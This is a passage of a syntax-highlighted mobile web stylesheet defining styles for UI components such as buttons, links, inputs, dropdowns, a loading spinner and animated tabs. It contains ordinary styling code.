class="variable">.c-slink-elem</span>:first-child::before,[data-pmd] <span class="variable">.c-slink</span> a:first-child::before&#123;left:0&#125;\n[data-pmd] <span class="variable">.c-slink-strong</span>&#123;margin-bottom:1px&#125;\n[data-pmd] <span class="variable">.c-slink-strong</span>:last-child&#123;margin-bottom:0&#125;\n[data-pmd] <span class="variable">.c-slink-strong</span>:last-child <span class="variable">.c-slink-elem</span>,[data-pmd] <span class="variable">.c-slink-strong</span>:last-child a&#123;border-bottom:1px solid #eee&#125;\n[data-pmd] <span class="variable">.c-slink-strong</span> <span class="variable">.c-slink-elem</span>,[data-pmd] <span class="variable">.c-slink-strong</span> a&#123;height:.3rem;<span class="attribute">margin-right</span>:1px;<span class="attribute">line-height</span>:.3rem;<span class="attribute">background-color</span>:#f5f5f5&#125;\n[data-pmd] <span class="variable">.c-slink-strong</span> <span class="variable">.c-slink-elem</span>:last-child,[data-pmd] <span class="variable">.c-slink-strong</span> a:last-child&#123;margin-right:0&#125;\n[data-pmd] <span class="variable">.c-slink-strong</span> <span class="variable">.c-slink-elem</span>::after,[data-pmd] <span class="variable">.c-slink-strong</span> <span class="variable">.c-slink-elem</span>:first-child::before,[data-pmd] <span class="variable">.c-slink-strong</span> a::after,[data-pmd] <span class="variable">.c-slink-strong</span> a:first-child::before&#123;display:none&#125;\n[data-pmd] <span class="variable">.c-slink-new</span>&#123;display:block;<span class="attribute">width</span>:100%;<span class="attribute">height</span>:.3rem;<span class="attribute">line-height</span>:.3rem;<span class="attribute">background-color</span>:#f5f5f5;<span class="attribute">font-size</span>:.14rem;<span class="attribute">color</span>:#000;<span class="attribute">text-align</span>:center;<span class="attribute">text-decoration</span>:none;<span class="attribute">overflow</span>:hidden;<span class="attribute">text-overflow</span>:ellipsis;<span class="attribute">white-space</span>:nowrap;<span class="attribute">padding</span>:0 .08rem;<span class="attribute">border-radius</span>:.03rem;<span class="attribute">vertical-align</span>:middle;<span class="attribute">outline</span>:0;<span class="attribute">-webkit-tap-highlight-color</span>:rgba(0,0,0,0)&#125;\n[data-pmd] <span class="variable">.c-slink-new</span>:visited&#123;color:#000&#125;\n[data-pmd] <span class="variable">.c-slink-new</span>:active&#123;background-color:#e5e5e5&#125;\n[data-pmd] <span class="variable">.c-slink-new-strong</span>&#123;display:block;<span class="attribute">width</span>:100%;<span class="attribute">background-color</span>:#f5f5f5;<span class="attribute">font-size</span>:.14rem;<span class="attribute">color</span>:#000;<span class="attribute">text-align</span>:center;<span class="attribute">text-decoration</span>:none;<span class="attribute">overflow</span>:hidden;<span class="attribute">text-overflow</span>:ellipsis;<span class="attribute">white-space</span>:nowrap;<span class="attribute">padding</span>:0 .08rem;<span class="attribute">border-radius</span>:.03rem;<span class="attribute">vertical-align</span>:middle;<span class="attribute">outline</span>:0;<span class="attribute">-webkit-tap-highlight-color</span>:rgba(0,0,0,0);<span class="attribute">height</span>:.3rem;<span class="attribute">line-height</span>:.3rem&#125;\n[data-pmd] <span class="variable">.c-slink-new-strong</span>:visited&#123;color:#000&#125;\n[data-pmd] <span class="variable">.c-slink-new-strong</span>:active&#123;background-color:#e5e5e5&#125;\n[data-pmd] <span class="variable">.c-slink-auto</span>&#123;display:inline-block;<span class="attribute">max-width</span>:100%;<span class="attribute">height</span>:.3rem;<span class="attribute">line-height</span>:.3rem;<span class="attribute">background-color</span>:#f5f5f5;<span class="attribute">font-size</span>:.14rem;<span class="attribute">color</span>:#000;<span class="attribute">text-align</span>:center;<span class="attribute">text-decoration</span>:none;<span class="attribute">overflow</span>:hidden;<span class="attribute">text-overflow</span>:ellipsis;<span class="attribute">white-space</span>:nowrap;<span class="attribute">padding</span>:0 .1rem;<span class="attribute">border-radius</span>:3px;<span class="attribute">vertical-align</span>:middle;<span class="attribute">outline</span>:0;<span class="attribute">-webkit-tap-highlight-color</span>:rgba(0,0,0,0)&#125;\n[data-pmd] <span class="variable">.c-slink-auto</span>:active&#123;background-color:#e5e5e5&#125;\n[data-pmd] <span class="variable">.c-slink-auto</span>:visited&#123;color:#000&#125;\n[data-pmd] <span class="variable">.c-text</span>&#123;display:inline-block;<span class="attribute">height</span>:14px;<span class="attribute">padding</span>:0 2px;<span class="attribute">margin-bottom</span>:2px;<span class="attribute">text-decoration</span>:none;<span class="attribute">vertical-align</span>:middle;<span class="attribute">color</span>:#fff;<span class="attribute">font-size</span>:10px;<span class="attribute">line-height</span>:15px;<span class="attribute">font-style</span>:normal;<span class="attribute">font-weight</span>:400;<span class="attribute">overflow</span>:hidden;<span class="attribute">border-radius</span>:2px&#125;\n[data-pmd] <span class="variable">.c-text-danger</span>&#123;background-color:#f13f40&#125;\n[data-pmd] <span class="variable">.c-text-public</span>&#123;background-color:#2b99ff&#125;\n[data-pmd] <span class="variable">.c-text-box</span>&#123;display:inline-block;<span class="attribute">padding</span>:1px 2px;<span class="attribute">margin-bottom</span>:2px;<span class="attribute">text-decoration</span>:none;<span class="attribute">vertical-align</span>:middle;<span class="attribute">font-size</span>:10px;<span class="attribute">line-height</span>:11px;<span class="attribute">height</span>:10px;<span class="attribute">font-style</span>:normal;<span class="attribute">font-weight</span>:400;<span class="attribute">overflow</span>:hidden;<span class="attribute">-webkit-box-sizing</span>:content-box;<span class="attribute">box-sizing</span>:content-box;<span class="attribute">border-radius</span>:2px&#125;\n[data-pmd] <span class="variable">.c-text-box-gray</span>&#123;color:#999;<span class="attribute">border</span>:1px solid #e3e3e3&#125;\n[data-pmd] <span class="variable">.c-text-box-orange</span>&#123;color:#f60;<span class="attribute">border</span>:1px solid #f3d9c5&#125;\n[data-pmd] <span class="variable">.c-text-box-pink</span>&#123;color:#ff4683;<span class="attribute">border</span>:1px solid #ffc7da&#125;\n[data-pmd] <span class="variable">.c-text-box-red</span>&#123;color:#f13f40;<span class="attribute">border</span>:1px solid #efb9b9&#125;\n[data-pmd] <span class="variable">.c-text-box-blue</span>&#123;color:#2b99ff;<span class="attribute">border</span>:1px solid #b3d4f3&#125;\n[data-pmd] <span class="variable">.c-text-box-green</span>&#123;color:#65b12c;<span class="attribute">border</span>:1px solid #d7efc6&#125;\n[data-pmd] <span class="variable">.c-text-box-yellow</span>&#123;color:#faa90e;<span class="attribute">border</span>:1px solid #feecc9&#125;\n[data-pmd] <span class="variable">.c-text-info</span>&#123;display:inline;<span class="attribute">color</span>:#999;<span class="attribute">font-style</span>:normal;<span class="attribute">font-weight</span>:400;<span class="attribute">font-family</span>:sans-serif&#125;\n[data-pmd] <span class="variable">.c-index</span>&#123;display:inline-block;<span class="attribute">height</span>:15px;<span class="attribute">margin</span>:0 5px 3px 0;<span class="attribute">text-align</span>:center;<span class="attribute">vertical-align</span>:middle;<span class="attribute">color</span>:#999;<span class="attribute">font-size</span>:14px;<span class="attribute">line-height</span>:15px;<span class="attribute">overflow</span>:hidden&#125;\n[data-pmd] <span class="variable">.c-index-hot-common</span>&#123;font-size:12px;<span class="attribute">color</span>:#fff;<span class="attribute">width</span>:16px&#125;\n[data-pmd] <span class="variable">.c-index-hot</span>,[data-pmd] <span class="variable">.c-index-hot</span>1&#123;background-color:#ff2d46;<span class="attribute">font-size</span>:12px;<span class="attribute">color</span>:#fff;<span class="attribute">width</span>:16px&#125;\n[data-pmd] <span class="variable">.c-index-hot</span>2&#123;background-color:#ff7f49;<span class="attribute">font-size</span>:12px;<span class="attribute">color</span>:#fff;<span class="attribute">width</span>:16px&#125;\n[data-pmd] <span class="variable">.c-index-hot</span>3&#123;background-color:#ffaa3b;<span class="attribute">font-size</span>:12px;<span class="attribute">color</span>:#fff;<span class="attribute">width</span>:16px&#125;\n[data-pmd] <span class="variable">.c-btn</span>&#123;display:inline-block;<span class="attribute">padding</span>:0 .08rem;<span class="attribute">width</span>:100%;<span class="attribute">height</span>:.3rem;<span class="attribute">font</span>:13px\/21px Arial,Helvetica,sans-serif;<span class="attribute">line-height</span>:.28rem;<span class="attribute">text-decoration</span>:none;<span class="attribute">text-align</span>:center;<span class="attribute">color</span>:#000;<span class="attribute">background-color</span>:#fff;<span class="attribute">border</span>:1px solid #707379;<span class="attribute">border-radius</span>:3px;<span class="attribute">vertical-align</span>:middle;<span class="attribute">overflow</span>:hidden;<span class="attribute">outline</span>:0;<span class="attribute">-webkit-tap-highlight-color</span>:rgba(0,0,0,0)&#125;\n[data-pmd] <span class="variable">.c-btn</span>:visited&#123;color:#000&#125;\n[data-pmd] <span class="variable">.c-btn</span>:active&#123;border-color:#707379;<span class="attribute">background-color</span>:#f2f2f2&#125;\n[data-pmd] <span class="variable">.c-btn</span> <span class="variable">.c-icon</span>&#123;position:relative;<span class="attribute">top</span>:-1px;<span class="attribute">vertical-align</span>:middle;<span class="attribute">font-size</span>:14px;<span class="attribute">margin-right</span>:4px&#125;\n[data-pmd] <span class="variable">.c-btn-small</span>&#123;display:inline-block;<span class="attribute">padding</span>:0 .08rem;<span class="attribute">width</span>:100%;<span class="attribute">height</span>:.3rem;<span class="attribute">line-height</span>:.28rem;<span class="attribute">font-size</span>:12px;<span class="attribute">font-weight</span>:400;<span class="attribute">text-decoration</span>:none;<span class="attribute">text-align</span>:center;<span class="attribute">color</span>:#000;<span class="attribute">background-color</span>:#fff;<span class="attribute">border</span>:1px solid #707379;<span class="attribute">border-radius</span>:3px;<span class="attribute">vertical-align</span>:middle;<span class="attribute">overflow</span>:hidden;<span class="attribute">outline</span>:0;<span class="attribute">-webkit-tap-highlight-color</span>:rgba(0,0,0,0)&#125;\n[data-pmd] <span class="variable">.c-btn-small</span>:visited&#123;color:#000&#125;\n[data-pmd] <span class="variable">.c-btn-small</span>:active&#123;border-color:#707379;<span class="attribute">background-color</span>:#f2f2f2&#125;\n[data-pmd] <span class="variable">.c-btn-small</span> <span class="variable">.c-icon</span>&#123;position:relative;<span class="attribute">top</span>:-1px;<span class="attribute">vertical-align</span>:middle;<span class="attribute">font-size</span>:14px;<span class="attribute">margin-right</span>:4px&#125;\n@media screen and (max-width:360px)&#123;\n[data-pmd] <span class="variable">.c-btn</span>&#123;padding:0 .05rem&#125;\n&#125;\n@media screen and (max-width:375px)&#123;\n[data-pmd] <span class="variable">.c-btn-small</span>&#123;padding:0 .02rem&#125;\n&#125;\n[data-pmd] <span class="variable">.c-btn-primary</span>&#123;background-color:#f8f8f8;<span class="attribute">border-color</span>:#d0d0d0;<span class="attribute">border-bottom-color</span>:#b2b2b2;<span class="attribute">-webkit-box-shadow</span>:0 1px 1px 0 #e1e1e1;<span class="attribute">box-shadow</span>:0 1px 1px 0 #e1e1e1&#125;\n[data-pmd] <span class="variable">.c-btn-primary</span> <span class="variable">.c-icon</span>&#123;color:#02aaf8&#125;\n[data-pmd] <span class="variable">.c-btn-disable</span>&#123;color:#999;<span class="attribute">background-color</span>:#fff;<span class="attribute">border-color</span>:#f1f1f1&#125;\n[data-pmd] <span class="variable">.c-btn-disable</span>:visited&#123;color:#999&#125;\n[data-pmd] <span class="variable">.c-btn-disable</span>:active&#123;border-color:#f1f1f1&#125;\n[data-pmd] <span class="variable">.c-btn-disable</span> <span class="variable">.c-icon</span>&#123;color:#999&#125;\n[data-pmd] <span class="variable">.c-btn-weak</span>&#123;height:.3rem;<span class="attribute">line-height</span>:.3rem;<span class="attribute">border-width</span>:0&#125;\n[data-pmd] <span class="variable">.c-btn-weak</span>:active&#123;background-color:#f2f2f2&#125;\n[data-pmd] <span class="variable">.c-btn-weak-auto</span>&#123;width:auto;<span class="attribute">height</span>:.3rem;<span class="attribute">line-height</span>:.3rem;<span class="attribute">border-width</span>:0&#125;\n[data-pmd] <span class="variable">.c-btn-weak-auto</span>:active&#123;background-color:#f2f2f2&#125;\n[data-pmd] <span class="variable">.c-btn-weak-gray</span>&#123;height:.3rem;<span class="attribute">line-height</span>:.3rem;<span class="attribute">background-color</span>:#f8f8f8;<span class="attribute">border-width</span>:0&#125;\n[data-pmd] <span class="variable">.c-btn-weak-gray</span>:active&#123;background-color:#e5e5e5&#125;\n[data-pmd] <span class="variable">.c-btn-pills</span>&#123;height:.2rem;<span class="attribute">padding</span>:0 .08rem;<span class="attribute">border-width</span>:0;<span class="attribute">border-radius</span>:.2rem;<span class="attribute">line-height</span>:.2rem;<span class="attribute">font-size</span>:10px;<span class="attribute">background-color</span>:rgba(0,0,0,.4);<span class="attribute">color</span>:#fff;<span class="attribute">width</span>:auto;<span class="attribute">word-spacing</span>:-3px;<span class="attribute">letter-spacing</span>:0&#125;\n[data-pmd] <span class="variable">.c-btn-pills</span> span&#123;position:relative;<span class="attribute">top</span>:1px&#125;\n[data-pmd] <span class="variable">.c-btn-pills</span>::selection&#123;color:#fff&#125;\n[data-pmd] <span class="variable">.c-btn-pills</span>:visited&#123;color:#fff&#125;\n[data-pmd] <span class="variable">.c-btn-pills</span>:active&#123;background-color:rgba(0,0,0,.4);<span class="attribute">color</span>:#fff&#125;\n[data-pmd] <span class="variable">.c-btn-pills</span> <span class="variable">.c-icon</span>&#123;font-size:10px;<span class="attribute">top</span>:1px;<span class="attribute">margin-right</span>:4px&#125;\n[data-pmd] <span class="variable">.c-btn-circle</span>&#123;height:.3rem;<span class="attribute">width</span>:.3rem;<span class="attribute">border-radius</span>:50%;<span class="attribute">color</span>:#fff;<span class="attribute">background-color</span>:rgba(0,0,0,.4);<span class="attribute">border</span>:0;<span class="attribute">padding</span>:0;<span class="attribute">line-height</span>:.3rem;<span class="attribute">text-align</span>:center;<span class="attribute">vertical-align</span>:middle;<span class="attribute">white-space</span>:nowrap&#125;\n[data-pmd] <span class="variable">.c-btn-circle</span>:active&#123;color:#fff;<span class="attribute">background-color</span>:rgba(0,0,0,.4)&#125;\n[data-pmd] <span class="variable">.c-btn-circle</span> <span class="variable">.c-icon</span>&#123;top:0;<span class="attribute">margin</span>:0;<span class="attribute">display</span>:block;<span class="attribute">font-size</span>:14px;<span class="attribute">color</span>:#fff&#125;\n[data-pmd] <span class="variable">.c-btn-circle-big</span>&#123;height:.3rem;<span class="attribute">width</span>:.3rem;<span class="attribute">border-radius</span>:50%;<span class="attribute">background-color</span>:rgba(0,0,0,.4);<span class="attribute">border</span>:0;<span class="attribute">padding</span>:0;<span class="attribute">line-height</span>:.3rem;<span class="attribute">text-align</span>:center;<span class="attribute">vertical-align</span>:middle;<span class="attribute">white-space</span>:nowrap;<span class="attribute">height</span>:.48rem;<span class="attribute">width</span>:.48rem;<span class="attribute">line-height</span>:.48rem;<span class="attribute">font-size</span>:18px;<span class="attribute">color</span>:#fff&#125;\n[data-pmd] <span class="variable">.c-btn-circle-big</span>:active&#123;color:#fff;<span class="attribute">background-color</span>:rgba(0,0,0,.4)&#125;\n[data-pmd] <span class="variable">.c-btn-circle-big</span> <span class="variable">.c-icon</span>&#123;top:0;<span class="attribute">margin</span>:0;<span class="attribute">display</span>:block;<span class="attribute">font-size</span>:14px;<span class="attribute">color</span>:#fff&#125;\n[data-pmd] <span class="variable">.c-btn-circle-big</span> <span class="variable">.c-icon</span>&#123;font-size:24px&#125;\n[data-pmd] <span class="variable">.c-input</span>&#123;word-break:normal;<span class="attribute">word-wrap</span>:normal;<span class="attribute">-webkit-appearance</span>:none;<span class="attribute">appearance</span>:none;<span class="attribute">display</span>:inline-block;<span class="attribute">padding</span>:0 .08rem;<span class="attribute">width</span>:100%;<span class="attribute">height</span>:.3rem;<span class="attribute">vertical-align</span>:middle;<span class="attribute">line-height</span>:normal;<span class="attribute">font-size</span>:.14rem;<span class="attribute">color</span>:#000;<span class="attribute">background-color</span>:#fff;<span class="attribute">border</span>:1px solid #eee;<span class="attribute">border-radius</span>:1px;<span class="attribute">overflow</span>:hidden;<span class="attribute">outline</span>:0&#125;\n[data-pmd] <span class="variable">.c-input</span>::-webkit-input-placeholder&#123;color:#999;<span class="attribute">border-color</span>:#eee&#125;\n[data-pmd] <span class="variable">.c-input</span>:focus&#123;border-color:#000&#125;\n[data-pmd] <span class="variable">.c-input</span>:focus <span class="variable">.c-icon</span>&#123;color:#dbdbdb&#125;\n[data-pmd] <span class="variable">.c-input</span>:disabled&#123;color:#999;<span class="attribute">border-color</span>:#f1f1f1&#125;\n[data-pmd] <span class="variable">.c-dropdown</span>&#123;position:relative;<span class="attribute">background-color</span>:#fff&#125;\n[data-pmd] <span class="variable">.c-dropdown</span>::before&#123;font-family:cicons;<span class="attribute">content</span>:\"\\e73c\";<span class="attribute">display</span>:inline-block;<span class="attribute">position</span>:absolute;<span class="attribute">bottom</span>:0;<span class="attribute">right</span>:.08rem;<span class="attribute">color</span>:#555;<span class="attribute">font-size</span>:.14rem;<span class="attribute">height</span>:.3rem;<span class="attribute">line-height</span>:.3rem&#125;\n[data-pmd] <span class="variable">.c-dropdown</span>&gt;label&#123;display:block;<span class="attribute">color</span>:#999;<span class="attribute">background-color</span>:#fff;<span class="attribute">width</span>:100%;<span class="attribute">height</span>:.26rem&#125;\n[data-pmd] <span class="variable">.c-dropdown</span>&gt;select&#123;word-break:normal;<span class="attribute">word-wrap</span>:normal;<span class="attribute">position</span>:relative;<span class="attribute">-webkit-appearance</span>:none;<span class="attribute">appearance</span>:none;<span class="attribute">display</span>:inline-block;<span class="attribute">padding</span>:0 .24rem 0 .08rem;<span class="attribute">width</span>:100%;<span class="attribute">height</span>:.3rem;<span class="attribute">vertical-align</span>:middle;<span class="attribute">line-height</span>:normal;<span class="attribute">font-size</span>:.14rem;<span class="attribute">color</span>:#000;<span class="attribute">background-color</span>:transparent;<span class="attribute">border</span>:1px solid #eee;<span class="attribute">border-radius</span>:0;<span class="attribute">overflow</span>:hidden;<span class="attribute">outline</span>:0&#125;\n[data-pmd] <span class="variable">.c-dropdown</span>&gt;select:focus&#123;border-color:#000&#125;\n[data-pmd] <span class="variable">.c-dropdown-disable</span>&#123;background-color:#fff&#125;\n[data-pmd] <span class="variable">.c-dropdown-disable</span>::before&#123;color:#999&#125;\n[data-pmd] <span class="variable">.c-dropdown-disable</span>&gt;label&#123;color:#999&#125;\n[data-pmd] <span class="variable">.c-dropdown-disable</span>&gt;select&#123;color:#999;<span class="attribute">border-color</span>:#f1f1f1&#125;\n[data-pmd] <span class="variable">.c-btn-shaft</span>&#123;border:1px solid #f1f1f1;<span class="attribute">text-overflow</span>:ellipsis;<span class="attribute">white-space</span>:nowrap&#125;\n[data-pmd] <span class="variable">.c-btn-shaft</span>:active&#123;border-color:#f1f1f1&#125;\n[data-pmd] <span class="variable">.c-tab-select</span>&#123;background-color:#f5f5f5;<span class="attribute">height</span>:.38rem;<span class="attribute">line-height</span>:.38rem;<span class="attribute">font-size</span>:.14rem;<span class="attribute">color</span>:#000;<span class="attribute">text-align</span>:center&#125;\n[data-pmd] <span class="variable">.c-tab-select</span> <span class="variable">.c-icon</span>&#123;display:inline-block;<span class="attribute">font-size</span>:.14rem;<span class="attribute">color</span>:#555&#125;\n[data-pmd] <span class="variable">.c-tab-select</span> <span class="variable">.c-span</span>12&#123;text-align:left&#125;\n[data-pmd] <span class="variable">.c-tab-select</span> <span class="variable">.c-span</span>12 <span class="variable">.c-icon</span>&#123;position:absolute;<span class="attribute">right</span>:0;<span class="attribute">bottom</span>:0&#125;\n@-webkit-keyframes c-loading-rotation&#123;\nfrom&#123;-webkit-transform:rotate(1deg)&#125;\nto&#123;-webkit-transform:rotate(360deg)&#125;\n&#125;\n[data-pmd] <span class="variable">.c-loading</span>,[data-pmd] <span class="variable">.c-loading-zbios</span>&#123;text-align:center&#125;\n[data-pmd] <span class="variable">.c-loading</span> i&#123;display:block;<span class="attribute">position</span>:relative;<span class="attribute">font-size</span>:.3rem;<span class="attribute">width</span>:.54rem;<span class="attribute">height</span>:.54rem;<span class="attribute">line-height</span>:.52rem;<span class="attribute">color</span>:#f3f3f3;<span class="attribute">margin</span>:auto&#125;\n[data-pmd] <span class="variable">.c-loading</span> i::before&#123;content:\"\";<span class="attribute">display</span>:block;<span class="attribute">position</span>:absolute;<span class="attribute">width</span>:.5rem;<span class="attribute">height</span>:.5rem;<span class="attribute">margin</span>:auto;<span class="attribute">border-radius</span>:50%;<span class="attribute">border</span>:.02rem solid #f3f3f3;<span class="attribute">border-top-color</span>:#ddd;<span class="attribute">-webkit-transform-origin</span>:50% 50%;<span class="attribute">-webkit-animation</span>:c-loading-rotation 1s ease 0s infinite normal&#125;\n[data-pmd] <span class="variable">.c-loading-zbios</span> i&#123;display:block;<span class="attribute">position</span>:relative;<span class="attribute">font-size</span>:.48rem;<span class="attribute">width</span>:.54rem;<span class="attribute">height</span>:.54rem;<span class="attribute">line-height</span>:.54rem;<span class="attribute">color</span>:#f3f3f3;<span class="attribute">margin</span>:auto;<span class="attribute">-webkit-transform-origin</span>:50% 50%;<span class="attribute">-webkit-animation</span>:c-loading-rotation .5s linear 0s infinite normal&#125;\n[data-pmd] <span class="variable">.c-loading</span> p,[data-pmd] <span class="variable">.c-loading-zbios</span> p&#123;color:#999;<span class="attribute">margin-top</span>:.08rem;<span class="attribute">text-indent</span>:.5em&#125;\n[data-pmd] <span class="variable">.c-tabs</span>&#123;position:relative&#125;\n[data-pmd] <span class="variable">.c-tabs-nav</span>&#123;position:relative;<span class="attribute">min-width</span>:100%;<span class="attribute">height</span>:.38rem;<span class="attribute">padding</span>:0 9px;<span class="attribute">font-size</span>:.14rem;<span class="attribute">white-space</span>:nowrap;<span class="attribute">background-color</span>:#f5f5f5;<span class="attribute">display</span>:-webkit-box;<span class="attribute">-webkit-box-orient</span>:horizontal;<span class="attribute">-webkit-box-direction</span>:normal;<span class="attribute">-webkit-box-pack</span>:justify;<span class="attribute">-webkit-box-align</span>:stretch;<span class="attribute">-webkit-box-lines</span>:single;<span class="attribute">display</span>:-webkit-flex;<span class="attribute">-webkit-flex-direction</span>:row;<span class="attribute">-webkit-justify-content</span>:space-between;<span class="attribute">-webkit-align-items</span>:stretch;<span class="attribute">-webkit-align-content</span>:flex-start;<span class="attribute">-webkit-flex-wrap</span>:nowrap;<span class="attribute">-webkit-user-select</span>:none!important;<span class="attribute">user-select</span>:none!important;<span class="attribute">-khtml-user-select</span>:none!important;<span class="attribute">-webkit-touch-callout</span>:none!important&#125;\n[data-pmd] <span class="variable">.c-tabs-nav</span> *&#123;-webkit-box-sizing:border-box;<span class="attribute">box-sizing</span>:border-box&#125;\n[data-pmd] <span class="variable">.c-tabs-nav-li</span>&#123;display:block;<span class="attribute">-webkit-box-flex</span>:1;<span class="attribute">-webkit-flex</span>:1 1 auto;<span class="attribute">width</span>:16.66666667%;<span class="attribute">list-style</span>:none;<span class="attribute">text-decoration</span>:none;<span class="attribute">height</span>:.38rem;<span class="attribute">line-height</span>:.38rem;<span class="attribute">color</span>:#555;<span class="attribute">text-align</span>:center;<span class="attribute">text-overflow</span>:ellipsis;<span class="attribute">white-space</span>:nowrap;<span class="attribute">overflow</span>:hidden;<span class="attribute">-webkit-tap-highlight-color</span>:rgba(0,0,0,0)&#125;\n[data-pmd] <span class="variable">.c-tabs-nav</span> <span class="variable">.c-tabs-nav-selected</span>&#123;color:#000;<span class="attribute">border-bottom</span>:1px solid #000&#125;\n[data-pmd] <span class="variable">.c-tabs-nav-bottom</span>&#123;border-top:1px solid #f1f1f1;<span class="attribute">padding</span>:0&#125;\n[data-pmd] <span class="variable">.c-tabs-nav-bottom</span> <span class="variable">.c-tabs-nav-li</span>&#123;color:#999&#125;\n[data-pmd] <span class="variable">.c-tabs-nav-bottom</span> <span class="variable">.c-tabs-nav-icon</span>&#123;display:none&#125;\n[data-pmd] <span class="variable">.c-tabs-nav-bottom</span> <span class="variable">.c-tabs-nav-selected</span>&#123;position:relative;<span class="attribute">top</span>:-1px;<span class="attribute">height</span>:.38rem;<span class="attribute">line-height</span>:.39rem;<span class="attribute">color</span>:#000;<span class="attribute">background-color</span>:#fff;<span class="attribute">border-bottom</span>:1px solid #000;<span class="attribute">border-top-color</span>:#fff&#125;\n[data-pmd] <span class="variable">.c-tabs-nav-bottom</span> <span class="variable">.c-tabs-nav-selected</span>:first-child&#123;margin-left:-1px&#125;\n[data-pmd] <span class="variable">.c-tabs-nav-bottom</span> <span class="variable">.c-tabs-nav-selected</span> <span class="variable">.c-tabs-nav-icon</span>&#123;display:inline-block;<span class="attribute">width</span>:.15rem;<span class="attribute">height</span>:.15rem&#125;\n[data-pmd] <span class="variable">.c-tabs-nav-view</span>&#123;position:relative;<span class="attribute">height</span>:.38rem;<span class="attribute">background-color</span>:#f5f5f5;<span class="attribute">overflow</span>:hidden&#125;\n[data-pmd] <span class="variable">.c-tabs-nav-view</span> <span class="variable">.c-tabs-nav</span>&#123;display:block&#125;\n[data-pmd] <span class="variable">.c-tabs-nav-view</span> <span class="variable">.c-tabs-nav</span> <span class="variable">.c-tabs-nav-li</span>&#123;display:inline-block;<span class="attribute">width</span>:auto;<span class="attribute">padding</span>:0 .17rem&#125;\n[data-pmd] <span class="variable">.c-tabs-nav-toggle</span>&#123;position:absolute;<span class="attribute">top</span>:0;<span class="attribute">right</span>:0;<span class="attribute">z-index</span>:9;<span class="attribute">display</span>:block;<span class="attribute">text-align</span>:center;<span class="attribute">width</span>:.38rem;<span class="attribute">height</span>:.38rem;<span class="attribute">border-left</span>:1px solid #eee;<span class="attribute">background-color</span>:#f5f5f5&#125;\n[data-pmd] <span class="variable">.c-tabs-nav-toggle</span>::before&#123;display:inline-block;<span class="attribute">font-family</span>:cicons;<span class="attribute">content</span>:\"\\e73c\";<span class="attribute">font-size</span>:.12rem;<span class="attribute">color</span>:#333;<span class="attribute">line-height</span>:.36rem&#125;\n[data-pmd] <span class="variable">.c-tabs-nav-layer</span>&#123;position:absolute;<span class="attribute">top</span>:0;<span class="attribute">z-index</span>:8;<span class="attribute">width</span>:100%;<span class="attribute">background-color</span>:#f5f5f5;<span class="attribute">border-bottom</span>:1px solid #eee&#125;\n[data-pmd] <span class="variable">.c-tabs-nav-layer</span> p&#123;color:#999;<span class="attribute">height</span>:.39rem;<span class="attribute">line-height</span>:.39rem;<span class="attribute">padding</span>:0 .17rem;<span class="attribute">border-bottom</span>:1px solid #eee&#125;\n[data-pmd] <span class="variable">.c-tabs-nav-layer-ul</span> <span class="variable">.c-tabs-nav-li</span>&#123;display:inline-block;<span class="attribute">width</span>:16.66666667%;<span class="attribute">padding</span>:0&#125;\n[data-pmd] <span class="variable">.c-tabs-nav-layer-ul</span> <span class="variable">.c-tabs-nav-selected</span>&#123;color:#000&#125;\n[data-pmd] <span class="variable">.c-tabs</span>2 <span class="variable">.c-tabs-view-content</span>&#123;overflow:hidden&#125;\n[data-pmd] <span class="variable">.c-tabs</span>2 <span class="variable">.c-tabs-content</span>&#123;position:relative;<span class="attribute">float</span>:left;<span class="attribute">display</span>:none&#125;\n[data-pmd] <span class="variable">.c-tabs</span>2 <span class="variable">.c-tabs-selected</span>&#123;display:block&#125;\n[data-pmd] <span class="variable">.c-tabs</span>2 <span class="variable">.c-tabs-view-content-anim</span>&#123;transition:height .3s cubic-bezier(.7,0,.3,1);<span class="attribute">-webkit-transition</span>:height .3s cubic-bezier(.7,0,.3,1);<span class="attribute">-moz-transition</span>:height .3s cubic-bezier(.7,0,.3,1);<span class="attribute">-o-transition</span>:height .3s cubic-bezier(.7,0,.3,1);<span class="attribute">transform</span>:translate3d(0,0,0);<span class="attribute">-webkit-transform</span>:translate3d(0,0,0);<span class="attribute">-moz-transition</span>:translate3d(0,0,0);<span class="attribute">-o-transition</span>:translate3d(0,0,0)&#125;\n[data-pmd] <span class="variable">.c-tabs</span>2 <span class="variable">.c-tabs-stopanimate</span>&#123;transition:none;<span class="attribute">-webkit-transition</span>:none;<span class="attribute">transform</span>:none;<span class="attribute">-webkit-transform</span>:none;<span class="attribute">-moz-transition</span>:none;<span class="attribute">-o-transition</span>:none&#125;\n[data-pmd] <span class="variable">.c-tabs</span>2 <span class="variable">.c-tabs-tabcontent</span>&#123;transition:transform .3s cubic-bezier(.7,0,.3,1);<span class="attribute">-webkit-transition</span>:transform .3s cubic-bezier(.7,0,.3,1);<span class="attribute">-moz-transition</span>:transform .3s cubic-bezier(.7,0,.3,1);<span class="attribute">-o-transition</span>:transform .3s cubic-bezier(.7,0,.3,1);<span class="attribute">transform</span>:translate3d(0,0,0);<span class="attribute">-webkit-transform</span>:translate3d(0,0,0);<span class="attribute">-moz-transition</span>:translate3d(0,0,0);<span class="attribute">-o-transition</span>:translate3d(0,0,0)&#125;\n[data-pmd] <span class="variable">.c-tabs-animation</span> <span class="variable">.c-tabs-view-content</span>&#123;margin:0 -.17rem;<span class="attribute">overflow</span>:hidden&#125;\n[data-pmd] <span class="variable">.c-tabs-animation</span> <span class="variable">.c-tabs-content</span>&#123;position:relative;<span class="attribute">padding-left</span>:.17rem;<span class="attribute">padding-right</span>:.17rem;<span class="attribute">box-sizing</span>:border-box;<span class="attribute">float</span>:left;<span class="attribute">display</span>:none&#125;\n[data-pmd] <span class="variable">.c-tabs-animation</span> <span class="variable">.c-tabs-selected</span>&#123;display:block&#125;\n[data-pmd] <span class="variable">.c-tabs-animation</span> <span class="variable">.c-tabs-view-content-anim</span>&#123;transition:height .3s cubic-bezier(.7,0,.3,1);<span class="attribute">-webkit-transition</span>:height .3s cubic-bezier(.7,0,.3,1);<span class="attribute">-moz-transition</span>:height .3s cubic-bezier(.7,0,.3,1);<span class="attribute">-o-transition</span>:height .3s cubic-bezier(.7,0,.3,1);<span class="attribute">transform</span>:translate3d(0,0,0);<span class="attribute">-webkit-transform</span>:translate3d(0,0,0);<span class="attribute">-moz-transition</span>:translate3d(0,0,0);<span class="attribute">-o-transition</span>:translate3d(0,0,0)&#125;\n[data-pmd] <span class="variable">.c-tabs-animation</span> <span class="variable">.c-tabs-stopanimate</span>&#123;transition:none;<span class="attribute">-webkit-transition</span>:none;<span class="attribute">transform</span>:none;<span class="attribute">-webkit-transform</span>:none;<span 